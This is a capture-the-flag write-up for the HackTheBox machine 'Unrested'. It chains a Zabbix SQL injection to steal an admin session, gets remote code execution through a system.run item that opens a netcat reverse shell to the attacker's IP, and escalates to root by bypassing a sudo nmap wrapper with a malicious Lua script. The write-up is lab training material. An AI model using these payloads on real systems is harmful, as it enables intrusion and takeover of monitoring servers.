```json
Alias: Unrested
Date: 03-01_2025
Platform: Hackthebox
OS: Linux
Difficulty: Medium
Status: Complete
IP: 10.10.11.50
```

# Unrested
# Summary

Unrested is a medium difficulty `Linux` machine hosting a version of `Zabbix`. Enumerating the version of `Zabbix` shows that it is vulnerable to both [CVE-2024-36467](https://nvd.nist.gov/vuln/detail/CVE-2024-36467) (missing access controls on the `user.update` function within the `CUser` class) and [CVE-2024-42327](https://nvd.nist.gov/vuln/detail/CVE-2024-42327) (SQL injection in `user.get` function in `CUser` class) which is leveraged to gain user access on the target. Post-exploitation enumeration reveals that the system has a `sudo` misconfiguration allowing the `zabbix` user to execute `sudo /usr/bin/nmap`, an optional dependency in `Zabbix` servers that is leveraged to gain `root` access.
 
---

As is common in real life pentests, you will start the Unrested box with credentials for the following account on Zabbix:

| Username | Password     |
| -------- | ------------ |
| matthew  | 96qzn0h2e1k3 |
# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-03 20:35 PKT
Nmap scan report for 10.10.11.50
Host is up (0.45s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.87 seconds

```


---
# Enumeration
## Port 80 - HTTP 

There is an instance of Zabbix running on port 80.

Zabbix is an open-source monitoring solution designed to monitor and track the status of various IT components, including:

1. **Networks** - Devices such as routers, switches, and firewalls.
2. **Servers** - Physical, virtual, or cloud-based servers.
3. **Applications** - Software applications, including databases, web servers, and custom applications.
4. **Services** - Monitoring services like HTTP, FTP, and email services.
5. **IoT Devices** - Internet of Things devices for industrial or consumer use.


---

# Exploitation

There is an SQLi in Zabbix 6.0.31 up to 7.00. A non-admin user account on the Zabbix frontend with the default User role, or with any other role that gives API access can exploit this vulnerability. An SQLi exists in the CUser class in the addRelatedObjects function, this function is being called from the CUser.get function which is available for every user who has API access.

The following call triggers the vulnerability:

```http
POST /api_jsonrpc.php HTTP/1.1
Host: localhost
User-Agent: curl/8.11.0
Accept: */*
Content-Type: application/json
Content-Length: 222
Connection: keep-alive

{
  "jsonrpc": "2.0",
  "method": "user.get",
  "params": {
    "selectRole": ["roleid", "name", "type", "readonly, (SELECT 1)"],
    "userids": ["1","2"]
  },
  "id": 1,
  "auth": ""
}
```

The following code from version 6.0.31 is vulnerable to SQLi:

```php
$db_roles = DBselect(
	'SELECT u.userid'.($options['selectRole'] ? ',r.'.implode(',r.', $options['selectRole']) : '').
	' FROM users u,role r'.
	' WHERE u.roleid=r.roleid'.
	' AND '.dbConditionInt('u.userid', $userIds)
);
```

The above post request won't work until we provide a value to the `auth` key. We can acquire this through the following API call:

```json
{
  "jsonrpc": "2.0",
  "method": "user.get",
  "params": {
    "username": "matthew",
    "password": "96qzn0h2e1k3"
  },
  "id": 1
}
```

Next I tried to get the Admin password and crack it using this query

`(SELECT passwd FROM users WHERE username = 'Admin')`

But I failed to crack it. So I tried to get the session key instead

`(SELECT sessionid FROM sessions WHERE userid = 1)`

And then I tried to recreate the `zbx_session` cookie going through their github and trying to find how it was created, but that failed since a random 16 byte key is generated and used to sign the token. So I looked around for a bit until I realized that the `auth` key being used in the API is same as our `sessionid`! So we can just provide the admin's `session_id` to it and get access to API calls we wouldn't normally have access to.

We usually get RCE in Zabbix by creating a new item that executes a command for us.

In Zabbix, an **item** represents a specific metric or command that the Zabbix server will monitor or execute. For example:

- An item could monitor CPU usage on a server.
- It could also execute a command on the host using the **`system.run`** key.

This is an example of an item that can view the free disk space on `/home/joe`.

`hostid: 10084` always belongs to the server that Zabbix is running on

```json
{
		"jsonrpc":"2.0",
		"method":"item.get",
		"params" :{
		"name":"Free disk space on /home/joe/",
		"key_":"vfs.fs.size[/home/joe/,free]",
		"hostid":"10084",
		"type":0,
		"value_type":3,
		"interfaceid":"1",
		"delay":30
		},
	"id":3,
	"auth": "34e5f5f1931b33e6f15b69f0c405f1d1"
}
```

We could also execute a command using:

```json
{
		"jsonrpc":"2.0",
		"method":"item.get",
		"params" :{
		"name":"Gain RCE",
		"key_":"system.run[busybox nc 10.10.16.49 4447 -e sh,nowait]",,
		"hostid":"10084",
		"type":0,
		"value_type":3,
		"interfaceid":"1",
		"delay":30
		},
	"id":3,
	"auth": "34e5f5f1931b33e6f15b69f0c405f1d1"
}
```

---
# Privilege Escalation

Doing a `sudo -l` shows that we can run `/usr/bin/nmap` as a super user, this file is a script which adds some blacklists to command line arguments

```bash
# List of restricted options and corresponding error messages
declare -A RESTRICTED_OPTIONS=(
    ["--interactive"]="Interactive mode is disabled for security reasons."
    ["--script"]="Script mode is disabled for security reasons."
    ["-oG"]="Scan outputs in Greppable format are disabled for security reasons."
    ["-iL"]="File input mode is disabled for security reasons."
)

# Check if any restricted options are used
for option in "${!RESTRICTED_OPTIONS[@]}"; do
    if [[ "$*" == *"$option"* ]]; then
        echo "${RESTRICTED_OPTIONS[$option]}"
        exit 1
    fi
done

# Execute the original nmap binary with the provided arguments
exec /usr/bin/nmap "$@"
```

Even though it blacklists the `--script` option, we can run default scripts with the `-sC` option. We can also specify a custom script directory using `--datadir`. Putting it together:

```bash
echo 'os.execute("/bin/bash")' > /tmp/nse_main.lua
sudo nmap --datadir=/tmp -sC localhost
```

---

# Flags
- 346a7f9be43c68fb586d2c6ceeb7c445
- fdbcf172b3bf4a55347002378a86c833

#CTF